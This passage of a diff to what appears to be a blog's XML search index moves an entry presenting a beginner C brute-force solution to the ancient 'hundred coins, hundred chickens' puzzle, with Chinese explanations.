+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> cock,hen,chick;</span><br><span class="line">	<span class="keyword">for</span>(cock=<span class="number">0</span>;cock&lt;=<span class="number">20</span>;cock++)<span class="comment">//100元全买公鸡可以买20只，也可以不买 </span></span><br><span class="line">		<span class="keyword">for</span>(hen=<span class="number">0</span>;hen&lt;=<span class="number">33</span>;hen++)<span class="comment">//100元全买母鸡可以买33只，也可以不买 </span></span><br><span class="line">			<span class="keyword">for</span>(chick=<span class="number">3</span>;chick&lt;=<span class="number">99</span>;chick++)<span class="comment">//100元全买小鸡最多99只，且是3的倍数 </span></span><br><span class="line">				<span class="keyword">if</span>(cock*<span class="number">5</span>+hen*<span class="number">3</span>+chick/<span class="number">3</span>==<span class="number">100</span>)<span class="comment">//是否花了100元 </span></span><br><span class="line">					<span class="keyword">if</span>(cock+hen+chick==<span class="number">100</span>)<span class="comment">//是否总共有100只 </span></span><br><span class="line">						<span class="keyword">if</span>(chick%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//买小鸡的数量是否是3的倍数 </span></span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">"cock:%d hen:%d chick:%d\n"</span>,cock,hen,chick);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/08/27/百钱买鸡/bai.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>选择排序</title>
     <url>/2019/07/17/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</url>
     <content><![CDATA[<h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>选择排序  </p>
@@ -1267,27 +1306,6 @@
 
 <p>运行结果：</p>
 <p><img src="//czheisenberg.github.io/2019/08/24/阶乘/j.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>百钱买鸡</title>
-    <url>/2019/08/27/%E7%99%BE%E9%92%B1%E4%B9%B0%E9%B8%A1/</url>
-    <content><![CDATA[<h1 id="百钱买鸡"><a href="#百钱买鸡" class="headerlink" title="百钱买鸡"></a>百钱买鸡</h1><p>我国古代数学家张丘建在他的《算经》中提出了一个著名的“百钱买百鸡问题”：  </p>
-<p>鸡翁一，值钱五，鸡母一，值钱三，鸡雏三，值钱一，百钱买百鸡，问翁、母、雏各几何？</p>
-<p>公鸡一只五元，母鸡一只三元，小鸡崽崽三只一元。</p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> cock,hen,chick;</span><br><span class="line">	<span class="keyword">for</span>(cock=<span class="number">0</span>;cock&lt;=<span class="number">20</span>;cock++)<span class="comment">//100元全买公鸡可以买20只，也可以不买 </span></span><br><span class="line">		<span class="keyword">for</span>(hen=<span class="number">0</span>;hen&lt;=<span class="number">33</span>;hen++)<span class="comment">//100元全买母鸡可以买33只，也可以不买 </span></span><br><span class="line">			<span class="keyword">for</span>(chick=<span class="number">3</span>;chick&lt;=<span class="number">99</span>;chick++)<span class="comment">//100元全买小鸡最多99只，且是3的倍数 </span></span><br><span class="line">				<span class="keyword">if</span>(cock*<span class="number">5</span>+hen*<span class="number">3</span>+chick/<span class="number">3</span>==<span class="number">100</span>)<span class="comment">//是否花了100元 </span></span><br><span class="line">					<span class="keyword">if</span>(cock+hen+chick==<span class="number">100</span>)<span class="comment">//是否总共有100只 </span></span><br><span class="line">						<span class="keyword">if</span>(chick%<span class="number">3</span>==<span class="number">0</span>)<span class="comment">//买小鸡的数量是否是3的倍数 </span></span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">"cock:%d hen:%d chick:%d\n"</span>,cock,hen,chick);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/27/百钱买鸡/bai.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
